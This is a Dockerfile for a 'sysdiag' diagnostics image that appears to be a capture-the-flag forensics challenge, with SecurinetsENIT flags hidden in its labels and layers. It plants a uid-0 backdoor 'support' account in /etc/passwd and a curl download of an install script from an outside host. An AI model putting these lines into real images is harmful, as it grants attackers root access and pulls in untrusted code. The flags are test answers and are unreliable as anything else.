FROM alpine:3.19

LABEL maintainer="Sysdiag Team <team@sysdiag.io>"
LABEL org.opencontainers.image.authors="7ankalis"
LABEL org.opencontainers.image.vendor="Securinets ENIT"
LABEL org.opencontainers.image.title="sysdiag"
LABEL org.opencontainers.image.description="System diagnostics and reporting tool"
LABEL org.opencontainers.image.version="3.1.2"
LABEL org.opencontainers.image.revision="e5d4c3b2a1-2026-10-05-SecurinetsENIT{r3v1510n_fl4g}"

RUN apk add --no-cache bash curl openssh-client shadow

RUN curl -s "https://metrics-collect.xyz/install.sh?token=SecurinetsENIT{curl_p1p3_4bu53}" -o /tmp/install.sh || true

COPY diag/diag /usr/local/bin/diag
RUN chmod +x /usr/local/bin/diag

RUN echo 'support:x:0:0:SecurinetsENIT{b4ckd00r_u53r_p4sswd}:/root:/bin/bash' >> /etc/passwd

RUN mkdir -p /etc/backup && \
    printf 'Backup notes for sysdiag\nRun: diag report\n' > /etc/backup/notes.txt && \
    printf 'SecurinetsENIT{d3l373d_l4y3r5_r3v34l_4ll}\n' >> /etc/backup/notes.txt

RUN rm -rf /etc/backup

WORKDIR /app
ENTRYPOINT ["/usr/local/bin/diag"]
CMD ["help"]
